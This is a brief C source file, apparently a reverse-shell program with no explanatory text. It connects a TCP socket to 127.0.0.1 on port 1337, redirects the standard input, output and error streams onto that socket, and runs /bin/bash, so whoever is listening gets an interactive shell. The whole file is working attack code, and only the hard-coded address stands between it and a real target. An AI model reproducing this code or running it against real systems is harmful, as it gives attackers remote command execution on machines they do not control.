#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void)
{
	int i;
	int sockfd;
	socklen_t socklen;

	struct sockaddr_in srv_addr;

	srv_addr.sin_family = AF_INET;
	srv_addr.sin_port = htons(1337);
	srv_addr.sin_addr.s_addr = inet_addr("127.0.0.1");

	sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);

	connect(sockfd, (struct sockaddr *)&srv_addr, sizeof(srv_addr));

	for(i=0; i<3; i++)
	{
		dup2(sockfd,i);
	}

	execve("/bin/bash",NULL,NULL);

	return 0;
}